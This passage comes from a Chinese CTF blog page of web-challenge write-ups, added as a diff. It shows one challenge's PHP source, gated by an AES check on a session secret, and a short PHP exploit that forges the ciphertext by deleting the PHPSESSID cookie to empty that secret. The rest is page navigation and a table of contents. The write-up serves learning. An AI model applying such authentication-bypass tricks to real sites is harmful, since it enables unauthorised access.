+        <span class="nv">$cipher</span> <span class="o">=</span> <span class="nx">aesEn</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="s1">'y1ng'</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$decr</span> <span class="o">===</span> <span class="nv">$cipher</span><span class="p">){</span>
+            <span class="k">echo</span> <span class="nx">WHAT_YOU_WANT</span><span class="p">;</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="k">die</span><span class="p">(</span><span class="s1">'爬'</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span> <span class="k">else</span><span class="p">{</span>
+        <span class="nb">header</span><span class="p">(</span><span class="s2">"Refresh:0.1;url=index.php"</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="c1">//I heard you can break PHP mt_rand seed
+</span>    <span class="nb">mt_srand</span><span class="p">(</span><span class="nb">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">9999999</span><span class="p">));</span>
+    <span class="nv">$length</span> <span class="o">=</span> <span class="nb">mt_rand</span><span class="p">(</span><span class="mi">40</span><span class="p">,</span><span class="mi">80</span><span class="p">);</span>
+    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'secret'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">bin2hex</span><span class="p">(</span><span class="nb">random_bytes</span><span class="p">(</span><span class="nv">$length</span><span class="p">));</span>
+<span class="p">}</span>
+
+
+<span class="cp">?&gt;</span>
+</code></pre></td></tr></tbody></table></div></div>
+
+<p>乍一看、$_SERVER[‘REMOTE_ADDR’]的值要是”127.0.0.1”，不过其实不影响，程序会继续执行。然后Check()的判断只要不乱改Cookie都可以过，然后就是破解AES加密了。</p>
+
+<p>可以看到aesEN()中只有$data是我们不知道的，它来自存放在SESSION中的一个随机数。看一下它的构成，因为只要设置了decrypt参数，$_SESSION[‘secret’]就不会更新，所以mt_rand()是可以爆破的，然而没什么用，random_bytes()过不了。</p>
+
+<p>这道题的思路是删掉Cookie中的PHPSESSID，这样$data就会被置空，Exp：</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><table style="margin: 0px"><tbody><tr><td class="gutter"><pre>1<br/>2<br/>3</pre></td><td class="code"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="k">echo</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">openssl_encrypt</span><span class="p">(</span><span class="s2">""</span><span class="p">,</span> <span class="s2">"AES-128-CBC"</span><span class="p">,</span> <span class="s2">"y1ng"</span><span class="p">,</span> <span class="nx">OPENSSL_RAW_DATA</span><span class="p">,</span> <span class="nb">md5</span><span class="p">(</span><span class="s2">"174.0.222.75"</span><span class="p">,</span> <span class="kc">true</span><span class="p">)));</span>
+<span class="cp">?&gt;</span>
+</code></pre></td></tr></tbody></table></div></div>
+
+<h2 id="备注-8">备注</h2>
+
+<ol>
+  <li>插一句Base64的构成是字母26*2、数字10、以及”+”和”/”两个符号，当然还有占位符”=”。</li>
+  <li>这道题一开始就没想到要用文件包含读文件，确实有问题。</li>
+  <li>然后删掉PHPSESSID也挺出乎意料的，还是经验不够，容易钻牛角尖。</li>
+</ol>
+
+<hr />
+
+<h1 id="easyaspdotnet">EasyAspDotNet</h1>
+
+<h2 id="备注-9">备注</h2>
+
+<p>被秒了，我被秒了。这道题触及到了我的知识盲区，Windows上的ASP。Emmm，mark一下..</p>
+
+
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+      
+      
+
+      
+      
+        <div class="post-nav" id="post-nav-id">
+          <div class="post-nav-next post-nav-item">
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/notes/2020/03/14/PHP-VSCode-Xdebug/" rel="prev" title="使用VSCode+Xdebug">
+                使用VSCode+Xdebug <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+      
+
+      
+    </footer>
+  </article>
+
+  <div class="post-spread">
+    
+  </div>
+</div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+        
+        
+        
+
+
+
+
+
+
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/uploads/avatar.jpg"
+               alt="Asinose" />
+          <p class="site-author-name" itemprop="name">Asinose</p>
+           
+              <p class="site-description motion-element" itemprop="description">flag{f14g_1s_n0t_h3r3}</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/">
+                <span class="site-state-item-count">20</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/">
+                <span class="site-state-item-count">2</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/">
+                <span class="site-state-item-count">14</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+        
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+
+
+
+
+
+
+
+            
+              <div class="post-toc-content">
+    <ol class=nav>
+      <li class="nav-item nav-level-1"> <a class="nav-link" href="#fake-google"> <span class="nav-number">1</span> <span class="nav-text">fake google</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-2"> <a class="nav-link" href="#题目描述"> <span class="nav-number">1.1</span> <span class="nav-text">题目描述</span> </a> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#解题思路"> <span class="nav-number">1.2</span> <span class="nav-text">解题思路</span> </a> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#备注"> <span class="nav-number">1.3</span> <span class="nav-text">备注</span> </a> </li> </ol> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#old-hack"> <span class="nav-number">2</span> <span class="nav-text">old-hack</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-2"> <a class="nav-link" href="#题目描述-1"> <span class="nav-number">2.1</span> <span class="nav-text">题目描述</span> </a> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#解题思路-1"> <span class="nav-number">2.2</span> <span class="nav-text">解题思路</span> </a> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#备注-1"> <span class="nav-number">2.3</span> <span class="nav-text">备注</span> </a> </li> </ol> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#dungshell"> <span class="nav-number">3</span> <span class="nav-text">dungShell</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-2"> <a class="nav-link" href="#题目描述-2"> <span class="nav-number">3.1</span> <span class="nav-text">题目描述</span> </a> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#解题思路-2"> <span class="nav-number">3.2</span> <span class="nav-text">解题思路</span> </a> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#备注-2"> <span class="nav-number">3.3</span> <span class="nav-text">备注</span> </a> </li> </ol> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#简单注入"> <span class="nav-number">4</span> <span class="nav-text">简单注入</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-2"> <a class="nav-link" href="#题目描述-3"> <span class="nav-number">4.1</span> <span class="nav-text">题目描述</span> </a> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#解题思路-3"> <span class="nav-number">4.2</span> <span class="nav-text">解题思路</span> </a> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#备注-3"> <span class="nav-number">4.3</span> <span class="nav-text">备注</span> </a> </li> </ol> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#假猪套天下第一"> <span class="nav-number">5</span> <span class="nav-text">假猪套天下第一</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-2"> <a class="nav-link" href="#题目描述-4"> <span class="nav-number">5.1</span> <span class="nav-text">题目描述</span> </a> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#解题思路-4"> <span class="nav-number">5.2</span> <span class="nav-text">解题思路</span> </a> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#备注-4"> <span class="nav-number">5.3</span> <span class="nav-text">备注</span> </a> </li> </ol> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#xss之光"> <span class="nav-number">6</span> <span class="nav-text">xss之光</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-2"> <a class="nav-link" href="#题目描述-5"> <span class="nav-number">6.1</span> <span class="nav-text">题目描述</span> </a> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#解题思路-5"> <span class="nav-number">6.2</span> <span class="nav-text">解题思路</span> </a> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#备注-5"> <span class="nav-number">6.3</span> <span class="nav-text">备注</span> </a> </li> </ol> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#schrodin"> <span class="nav-number">7</span> <span class="nav-text">Schrodin</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-2"> <a class="nav-link" href="#题目描述-6"> <span class="nav-number">7.1</span> <span class="nav-text">题目描述</span> </a> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#解题思路-6"> <span class="nav-number">7.2</span> <span class="nav-text">解题思路</span> </a> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#备注-6"> <span class="nav-number">7.3</span> <span class="nav-text">备注</span> </a> </li> </ol> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#elementmaster"> <span class="nav-number">8</span> <span class="nav-text">elementmaster</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-2"> <a class="nav-link" href="#题目描述-7"> <span class="nav-number">8.1</span> <span class="nav-text">题目描述</span> </a> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#解题思路-7"> <span class="nav-number">8.2</span> <span class="nav-text">解题思路</span> </a> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#备注-7"> <span class="nav-number">8.3</span> <span class="nav-text">备注</span> </a> </li> </ol> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#文件探测"> <span class="nav-number">9</span> <span class="nav-text">文件探测</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-2"> <a class="nav-link" href="#题目描述-8"> <span class="nav-number">9.1</span> <span class="nav-text">题目描述</span> </a> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#解题思路-8"> <span class="nav-number">9.2</span> <span class="nav-text">解题思路</span> </a> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#备注-8"> <span class="nav-number">9.3</span> <span class="nav-text">备注</span> </a> </li> </ol> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#easyaspdotnet"> <span class="nav-number">10</span> <span class="nav-text">EasyAspDotNet</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-2"> <a class="nav-link" href="#备注-9"> <span class="nav-number">10.1</span> <span class="nav-text">备注</span> </a> </li> </ol> </li>
+    </ol>
+  </div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  
+  &copy;  2019 - 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Asinose</span>
+</div>
+
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+   
+  
+  
+  
+  
+  
+  <script type="text/javascript" src="/assets/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  
+  
+  
+  
+  <script type="text/javascript" src="/assets/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  
+  
+  
+  
+  <script type="text/javascript" src="/assets/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  
+  
+  
+  
+  <script type="text/javascript" src="/assets/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  
+  
+  
+  
+  <script type="text/javascript" src="/assets/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  
+  
+  
+  
+  <script type="text/javascript" src="/assets/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/assets/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/assets/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/assets/js/src/affix.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/assets/js/src/schemes/pisces.js?v=5.1.1"></script>
+
+
+
+  <script type="text/javascript" src="/assets/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/assets/js/src/post-details.js?v=5.1.1"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/assets/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+
+    
+
+  
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+  
+
+  
+  
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
+
